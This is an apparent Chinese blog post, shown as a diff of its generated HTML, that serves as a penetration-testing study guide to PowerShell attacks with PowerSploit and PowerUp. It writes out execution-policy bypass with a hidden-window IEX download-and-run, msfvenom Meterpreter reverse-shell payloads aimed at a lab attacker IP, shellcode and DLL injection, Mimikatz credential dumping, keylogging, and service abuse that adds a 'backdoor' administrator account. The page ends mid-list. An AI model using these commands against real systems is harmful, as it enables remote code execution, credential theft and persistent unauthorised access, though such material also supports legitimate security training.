@@ -1,0 +1,918 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Bsmslwx">
+  <meta name="keywords" content="">
+  
+  <title>渗透测试实战指南-PowerShell攻击指南 ~ BsmslwxBlog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":80,"cursorChar":".","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Bsmslwx</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/bg4.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="渗透测试实战指南-PowerShell攻击指南">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-08-04 22:10" pubdate>
+        2021年8月4日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      6.7k 字
+    </span>
+  
+
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+            <div class="scroll-down-bar">
+              <i class="iconfont icon-arrowdown"></i>
+            </div>
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">渗透测试实战指南-PowerShell攻击指南</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年10月4日 中午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="PowerShell攻击指南"><a href="#PowerShell攻击指南" class="headerlink" title="PowerShell攻击指南"></a>PowerShell攻击指南</h1><h2 id="1-PowerShell-技术"><a href="#1-PowerShell-技术" class="headerlink" title="1. PowerShell 技术"></a>1. PowerShell 技术</h2><p>Windows PowerShell是一种命令行外壳程序和脚本环境，它内置在每个受支持的Windows版本中 (Windows 7/Windows 2008 R2和更高版本)，使命令行用户和脚本编写者可以利用.NET Framework的强大功能。一旦攻击者可以在一台计算机上运行代码，他们就会下载PowerShell脚本文件(.ps1)到磁盘中执行，甚至无须写到磁盘中执行，它可以直接在内存中运行，也可以把PowerShell看作命令行提示符cmd.exe的扩充！</p>
+<p>目前PowerShell具有以下优点</p>
+<ol>
+<li>Windows 7以上的操作系统默认安装</li>
+<li>PowerShell脚本可以运行在内存中,不需要写入磁盘</li>
+<li>可以从另一个系统中下载PowerShell脚本并执行</li>
+<li>目前很多工具都是基于PowerShell开发的</li>
+<li>很多安全软件并不能检测到PowerShell的活动</li>
+<li>cmd.exe通常会被阻止运行,但是PowerShell不会</li>
+<li>可以用来管理活动目录</li>
+</ol>
+<p>常用的PowerShell攻击工具有以下几种</p>
+<ol>
+<li> PowerSplit：这是众多PowerShell攻击工具中被广泛使用的PowerShell后期漏洞利用框架，常用于信息探测、特权提升、凭证窃取、持久化等操作</li>
+<li>Nishang：基于PowerShell的渗透测试专用工具，集成了框架、脚本和各种Payload，包含下载和执行、键盘记录、DNS、延时命令等脚本</li>
+<li>Empire：基于PowerShell的远程控制木马，可以从凭证数据库中导出和跟踪凭证信息，常用于提供前期漏洞利用的集成模块、信息探测、凭据窃取、持久化控制</li>
+<li>PowerCat：PowerShell版的NetCat，有着网络工具中的“瑞士军刀”美誉，它能通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向</li>
+</ol>
+<h3 id="1-1-PowerShell的基本概念"><a href="#1-1-PowerShell的基本概念" class="headerlink" title="1.1 PowerShell的基本概念"></a>1.1 PowerShell的基本概念</h3><ol>
+<li><p>PS1文件</p>
+<p>PowerShell脚本类似bat脚本，后缀为PS1</p>
+</li>
+<li><p>执行策略</p>
+<p>为防止恶意脚本的执行，PowerShell有一个执行策略，默认情况下，执行策略被设为受限</p>
+<p>在PowerShell脚本无法执行时，可以使用cmdlet命令确认当前的执行策略</p>
+<ul>
+<li>Get-ExecutionPolicy</li>
+<li>Bypass：任意执行</li>
+<li>Restricted：脚本不能运行(默认设置)</li>
+<li>RemoteSigned：本地创建的脚本可以运行，但是从网上下载的脚本不能运行(拥有数字证书签名的除外)</li>
+<li>AllSigned：仅当脚本由受信任的发布者签名时才能运行</li>
+<li>Unrestricted：允许全部脚本执行，对非本地脚本给出提示</li>
+<li>Undefined：设置为默认</li>
+</ul>
+<p>可以使用以下的命令设置执行策略</p>
+<p>Set-ExecutionPolicy &lt;Policy name&gt;</p>
+</li>
+<li><p>运行脚本</p>
+<p>运行脚本需要输入完整路径，或在当前目录下输入./文件名</p>
+</li>
+<li><p>管道</p>
+<p>管道的作用是将一个命令的输作为另一个命令的输入，两个命令之间用管道符号<code>|</code>连接</p>
+<p>举例：<code>get-process p*|stop-process</code> 停止当前运行中以p开头命名的程序</p>
+</li>
+</ol>
+<h3 id="1-2-PowerShell-常用命令"><a href="#1-2-PowerShell-常用命令" class="headerlink" title="1.2 PowerShell 常用命令"></a>1.2 PowerShell 常用命令</h3><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 新建目录</span><br><span class="hljs-built_in">new-item</span> test <span class="hljs-literal">-type</span> directory <span class="hljs-comment"># 可简写为dir</span><br><span class="hljs-comment"># 新建文件</span><br><span class="hljs-built_in">new-item</span> text.txt <span class="hljs-literal">-type</span> file<br><span class="hljs-comment"># 删除目录或文件</span><br><span class="hljs-built_in">remove-item</span> text.txt<br><span class="hljs-comment"># 显示文本内容</span><br><span class="hljs-built_in">get-content</span> text.txt<br><span class="hljs-comment"># 设置文本内容</span><br><span class="hljs-built_in">set-content</span> text.txt <span class="hljs-literal">-value</span> <span class="hljs-string">&quot;Hello&quot;</span><br><span class="hljs-comment"># 追加内容</span><br><span class="hljs-built_in">add-content</span> one.txt <span class="hljs-literal">-value</span> <span class="hljs-string">&quot;add&quot;</span><br><span class="hljs-comment"># 清除内容</span><br><span class="hljs-built_in">clear-content</span> one.txt<br></code></pre></div></td></tr></table></figure>
+
+<p>如果要运行PowerShell脚本程序，必须用管理员权限将Restricted策略改成Unrestricted，所有以下方法绕过策略来执行脚本</p>
+<ol>
+<li><p>绕过本地权限执行</p>
+<p>上传脚本到服务器，在CMD环境下，在目标服务器本地执行该脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">PowerShell.exe-ExecutionPolicy Bypass-File ***.ps1<br></code></pre></div></td></tr></table></figure></li>
+<li><p>本地隐藏绕过权限执行脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -noprofile-nonl iex(new-objectNet.webclient) .downloadstring (<span class="hljs-string">&quot;**.ps1&quot;</span>) ; [parameters]<br></code></pre></div></td></tr></table></figure>
+
+<p>对上述命令的参数进行说明</p>
+<ul>
+<li>excutionpolicy bypass：绕过执行安全策略</li>
+<li>windowstyle hidden：隐藏窗口</li>
+<li>nologo：启动不显示版权标示的PowerShell</li>
+<li>noninteractive(- nonl):非交互模式，PowerShell不为用户提供交互的提示</li>
+<li>noprofile(-nop):PowerShell控制台不加载当前用户的配置文件</li>
+<li>Noexit:执行后不退出Shell</li>
+</ul>
+</li>
+</ol>
+<h2 id="2-PowerSploit"><a href="#2-PowerSploit" class="headerlink" title="2. PowerSploit"></a>2. PowerSploit</h2><p>PowerSploit是一款基于PowerShell的后渗透(Post-Exploitation)框架软件，包含很多PowerShell攻击脚本，它们主要用于渗透中的信息侦察、权限提升、权限维持，其GitHub地址为https: //github.com/PowerShellMafia/PowerSploit</p>
+<h3 id="2-1-PowerSploit安装"><a href="#2-1-PowerSploit安装" class="headerlink" title="2.1 PowerSploit安装"></a>2.1 PowerSploit安装</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 首先克隆具体文件</span><br>git <span class="hljs-built_in">clone</span> https://github.com/PowerShellMafia/PowerSploit<br><span class="hljs-comment"># 开启www服务</span><br>service apache start<br></code></pre></div></td></tr></table></figure>
+
+<p>将文件复制到网站目录</p>
+<p>各模块功能</p>
+<ul>
+<li>AntivirusBypass: 发现杀毒软件的查杀特征</li>
+<li>CodeExecution: 在目标主机上执行代码</li>
+<li>Exfiltration: 目标主机上的信息搜集工具</li>
+<li>Mayhem: 蓝屏等破坏性脚本</li>
+<li>Persistence: 后门脚本(持久性控制)</li>
+<li>Recon: 以目标主机位跳板进行内网信息侦查</li>
+<li>ScriptModification: 在目标主机上创建或修改脚本</li>
+</ul>
+<p>对使用较多的脚本进行介绍</p>
+<h4 id="2-1-1-Invoke-Shellcode"><a href="#2-1-1-Invoke-Shellcode" class="headerlink" title="2.1.1 Invoke-Shellcode"></a>2.1.1 Invoke-Shellcode</h4><p>CodeExecution模块下的Invoke-Shellcode脚本常用于将ShellCode插入指定的进程ID或本地PowewrShell中。以下介绍常用的反弹Meterpreter Shell方法</p>
+<ol>
+<li><p>直接执行ShellCode反弹Meterpreter Shell</p>
+<p>在MSF中使用reverse_https模块进行反弹，设置内容如下</p>
+<p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210808225810.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用<code>msfvenom</code>命令生成一个PowerShell脚本密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">msfvenom -p wimdows/meterpreter/reverse_https lhost=192.168.66.132 lport=4444 -f powershell -o /var/<span class="hljs-built_in">local</span>/<br></code></pre></div></td></tr></table></figure>
+
+<p>之后在目标机执行如下命令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 获取脚本</span><br><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">new-object</span> Net.webclient).downloadstring(<span class="hljs-string">&quot;http://192.168.66.129/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&quot;</span>)<br><span class="hljs-comment"># 获取病毒文件</span><br><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">new-object</span> Net.webclient).downloadstring(<span class="hljs-string">&quot;http://192.168.66.129/test&quot;</span>)<br><span class="hljs-comment"># 执行病毒文件 -force表示不用提示直接执行</span><br><span class="hljs-built_in">Invoke-Shellcode</span> <span class="hljs-literal">-shellcode</span> <span class="hljs-variable">$buf</span> <span class="hljs-literal">-force</span> <span class="hljs-comment"># 执行时出现问题，暂时只是进行记录</span><br><span class="hljs-comment"># 使用如下命令获取帮助</span><br><span class="hljs-built_in">get-help</span> <span class="hljs-built_in">Invoke-Shellcode</span> <span class="hljs-literal">-full</span><br></code></pre></div></td></tr></table></figure>
+
+<p>指定进程注入</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 首先依旧是获取内容</span><br><span class="hljs-comment"># 获取脚本</span><br><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">new-object</span> Net.webclient).downloadstring(<span class="hljs-string">&quot;http://192.168.66.129/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&quot;</span>)<br><span class="hljs-comment"># 获取病毒文件</span><br><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">new-object</span> Net.webclient).downloadstring(<span class="hljs-string">&quot;http://192.168.66.129/test&quot;</span>)<br><span class="hljs-comment"># 获取当前进程</span><br><span class="hljs-built_in">ps</span> <span class="hljs-comment"># 或 get-process</span><br><span class="hljs-comment"># 注入进程</span><br><span class="hljs-built_in">invoke-shellcode</span> <span class="hljs-literal">-processID</span> (ID) <span class="hljs-literal">-shellcode</span> <span class="hljs-variable">$buf</span> <span class="hljs-literal">-force</span><br></code></pre></div></td></tr></table></figure></li>
+</ol>
+<h4 id="2-1-2-Invoke-DllInjection"><a href="#2-1-2-Invoke-DllInjection" class="headerlink" title="2.1.2 Invoke-DllInjection"></a>2.1.2 Invoke-DllInjection</h4><p>同样是Code Execution模块下的另一个脚本Invoke-DLLInjection，它是一个DLL注入的脚本</p>
+<p>同理还是先下载脚本,输入以下命令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/CodeExecution/Invoke-Dlllnjection.ps1&quot;</span>)<br></code></pre></div></td></tr></table></figure>
+
+
+<p>然后使用以下命令在Kali中生成一个DLL注入脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.66.132 lport=4444 -f dll -o test.dll <br></code></pre></div></td></tr></table></figure>
+
+<p>之后使用如下命令进行注入</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">invoke-dllinjection</span> <span class="hljs-literal">-processid</span> <span class="hljs-number">200</span> <span class="hljs-literal">-dll</span> c:\test.dll <span class="hljs-comment"># 同样不能执行</span><br></code></pre></div></td></tr></table></figure>
+
+
+
+<h4 id="2-1-3-Invoke-Portscan"><a href="#2-1-3-Invoke-Portscan" class="headerlink" title="2.1.3 Invoke-Portscan"></a>2.1.3 Invoke-Portscan</h4><p>Invoke-Portscan是Recon模块下的脚本，用于端口扫描</p>
+<p>首先下载脚本</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).Downloadstring(<span class="hljs-string">&quot;http://192.168.66.129/PowerSploit/Recon/Invoke-Portscan.ps1&quot;</span>)<br><span class="hljs-comment"># 脚本执行命令</span><br><span class="hljs-built_in">Invoke-portscan</span> <span class="hljs-literal">-hosts</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>,<span class="hljs-number">192.168</span>.<span class="hljs-number">1.2</span> <span class="hljs-literal">-ports</span> <span class="hljs-string">&quot;80,22,3389&quot;</span><br></code></pre></div></td></tr></table></figure>
+
+<h4 id="2-1-4-Invoke-Mimikatz"><a href="#2-1-4-Invoke-Mimikatz" class="headerlink" title="2.1.4 Invoke-Mimikatz"></a>2.1.4 Invoke-Mimikatz</h4><p>Invoke-Mimikatz是Exfiltration模块下的一个脚本，用于捕捉密码</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 下载脚本</span><br><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).Downloadstring(<span class="hljs-string">&quot;http://192.168.66.129/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1&quot;</span>)<br><span class="hljs-comment"># 使用脚本</span><br><span class="hljs-built_in">Invoke-mimikatz</span> <span class="hljs-literal">-dumpcreds</span> <span class="hljs-comment"># 还是一大堆报错！！！！</span><br></code></pre></div></td></tr></table></figure>
+
+<h4 id="2-1-5-Get-keystrokes"><a href="#2-1-5-Get-keystrokes" class="headerlink" title="2.1.5 Get-keystrokes"></a>2.1.5 Get-keystrokes</h4><p>Get-Keystrokes是Exfiltration模块下的一个脚本，用于键盘记录，功能相当强大，不仅有键盘输入记录，甚至能记录鼠标的点击情况,还能记录详细的时间,实战时可以直接放入后台运行。同样先使用以下命令下载脚本</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).Downloadstring(<span class="hljs-string">&quot;http://192.168.66.129/PowerSploit/Exfiltration/Get-keystrokes.ps1&quot;</span>)<br><span class="hljs-comment"># 导出数据命令</span><br><span class="hljs-built_in">Get-keystrokes</span> <span class="hljs-literal">-logpath</span> C:\text.txt <span class="hljs-comment"># 始终无记录，可能是由于虚拟机的缘故</span><br></code></pre></div></td></tr></table></figure>
+
+<h3 id="2-2-PowerUp-攻击模块讲解"><a href="#2-2-PowerUp-攻击模块讲解" class="headerlink" title="2.2 PowerUp 攻击模块讲解"></a>2.2 PowerUp 攻击模块讲解</h3><p>powerup是privesc模块下的一个脚本，只要是用于寻找目标主机windows服务劳动进行提权的脚本</p>
+<p>可在有模块的机器使用<code>import-module</code>命令加载powerup脚本模块</p>
+<p>常用模块介绍</p>
+<ol>
+<li><p>Invoke-AllChecks</p>
+<p>模块作用是自动执行PowerUp下所有的脚本来检查目标主机,直接使用命令即可<code>invoke-allchecks</code></p>
+</li>
+<li><p>Find-PathDLLHijack</p>
+<p>模块用于检查当前%path%的那些目录是用户可以写入的，直接使用命令<code>find-pathdllhijack</code></p>
+</li>
+<li><p>Get-ApplicationHost</p>
+<p>模块可利用系统的applicationHost.config文件恢复加密过的应用池和虚拟目录的密码，执行命令<code>get-applicationhost</code>列表展示命令<code>get-applicationhost |format-table-autosize</code></p>
+</li>
+<li><p>Get-RegistryAlwaysInstallElevated</p>
+<p>模块用于检查AlwaysInstallElevatec注册表项是否被设置，绕过被设置，则以为MSI文件是以SYSTEM权限运行。执行命令<code>get-registryalwaysinstallelevated</code></p>
+</li>
+<li><p>Get-RegistryAutoLogon</p>
+<p>模块用于检测Winlogin注册表的AutoAdminLogon项有没有被设置，可查询默认的用户名和密码，执行命令<code>get-registrysutologon</code></p>
+</li>
+<li><p>Get-ServiceDetail</p>
+<p>模块用于返回某服务的信息，输入命令如下</p>
+<p><code>get-servicedetail -servicename dhcp</code></p>
+</li>
+<li><p>Get-ServiceFilePermission</p>
+<p>模块用于检查当前用户能够在哪些服务的命令写入相关联的可执行文件，我们可以通过这些文件首先提权，命令执行<code>get-servicefilepermission</code></p>
+</li>
+<li><p>Test-ServiceDaclPermission</p>
+<p>模块用于检查所有可用的服务，并产生对这些打开的服务进行修改，如果可修改就返回该服务对象，执行命令<code>test-sercicedaclpermission</code></p>
+</li>
+<li><p>Get-ServiceUnquoted</p>
+<p>模块用于检查服务路径，返回包含空格但是不带引号的服务路径。此处利用了windows的一个逻辑漏洞，即当文件包含空格时，Windows API会被解释为两个路径，并将这两个文件同时执行，有时可能会造成权限的提升</p>
+<p>例子：C:\program files\hello.exe会被解释为C:\program.exe和C:\program files\hello.exe</p>
+<p>执行命令:<code>get-serviceunquoted</code></p>
+</li>
+<li><p>Get-UnattendedInstallFile</p>
+<p>模块用于检查一下路径，查找是否存在这些文件，文件中可能包含部署凭据，文件包括：</p>
+<ul>
+<li>C:\sysprep\sysprep.xml</li>
+<li>C:\sysprep\sysprep.inf</li>
+<li>C:\sysprep.inf</li>
+<li>C:\Windows\Panther\Unattended.xml</li>
+<li>C:\Windows\Panther\Unattend\Unattended.xml</li>
+<li>C:\Windows\Panther\Unattend.xml</li>
+<li>C:\Windows\Panther\Unattend\Unattend.xml</li>
+<li>C:\Windows\System32\Sysprep\unattend.xml</li>
+<li>C:\Windows\System32\Sysprep\Panther\unattend.xml</li>
+</ul>
+<p>执行命令<code>get-unattendedinstallfile</code></p>
+</li>
+<li><p>Get-ModifiableRegistryAutoRun</p>
+<p>模块用于检查开机自启的应用程序路径和注册表键值，然后返回当前用户可修改的程序路径。被检查的注册表键值有：</p>
+<ul>
+<li>HKLM\SOFTWAREMicrosoft\Windows\CurrentVersion\Run</li>
+<li>HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce</li>
+<li>HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run</li>
+<li>HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run Once</li>
+<li>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService</li>
+<li>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService</li>
+<li>HKLMSOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run Service</li>
+<li>HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run OnceService</li>
+</ul>
+<p>执行命令<code>get-modifiableregistryautorun</code></p>
+</li>
+<li><p>Get-ModifiableScheduledTaskFile</p>
+<p>模块用于返回当前用户能够修改的计划任务程序的名称和路径，执行命令<code>get-modifiablescheduledtaskfile</code></p>
+</li>
+<li><p>Get-Webconfig</p>
+<p>模块用于返回当前服务器上的web.config文件中的数据库连接字符串的明文。执行命令<code>get-webconfig</code></p>
+</li>
+<li><p>Invoke-ServiceAbuse</p>
+<p>模块通过修改服务来添加用户到指定组，并可以通过设置-cmd产生触发添加用户的自定义命令，具体命令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 查看当前正在运行的服务</span><br><span class="hljs-built_in">get-service</span> | <span class="hljs-built_in">where-object</span> &#123;<span class="hljs-variable">$_</span>.status <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;running&quot;</span>&#125;<br><span class="hljs-comment"># 添加默认账号</span><br><span class="hljs-built_in">invoke-serviceabuse</span> <span class="hljs-literal">-servicename</span> 服务<br><span class="hljs-comment"># 指定添加的域账号</span><br><span class="hljs-built_in">invoke-serviceabuse</span> <span class="hljs-literal">-servicename</span> 服务 <span class="hljs-literal">-username</span> <span class="hljs-string">&quot;TEST\john&quot;</span><br><span class="hljs-comment"># 指定添加用户，用户密码及添加的用户组</span><br><span class="hljs-built_in">invoke-serviceabuse</span> <span class="hljs-literal">-servicename</span> 服务 <span class="hljs-literal">-username</span> backdoor <span class="hljs-literal">-password</span> password <span class="hljs-literal">-localgroup</span> <span class="hljs-string">&quot;administrators&quot;</span><br><span class="hljs-comment"># 自定义执行命令</span><br><span class="hljs-built_in">invoke-serviceabuse</span> <span class="hljs-literal">-servicename</span> 服务 <span class="hljs-literal">-command</span> <span class="hljs-string">&quot;net...&quot;</span><br></code></pre></div></td></tr></table></figure>
+<p> <img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210810161355.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>Restore-ServiceBinaty</p>
+<p>模块用于恢复服务的可执行文件到原始目录，执行命令如下<code>restore-servicebinary -servicename 服务</code></p>
+</li>
+<li><p>Test-ServiceDaclPermission</p>
+<p>模块检查某个用户是否在服务中有自由访问控制的权限，结果返回true或false。执行命令<code>test-servicedaclpermission -servicename 服务</code></p>
+</li>
+<li><p>Write-HijackDll</p>
+<p>模块用于输出一个自定义命令并且能够自我删除的bat文件到$env: Temp\debug.bat，并输出一个能够启动这个bat文件的DLL</p>
+</li>
+<li><p>Write-UserAddMSI</p>
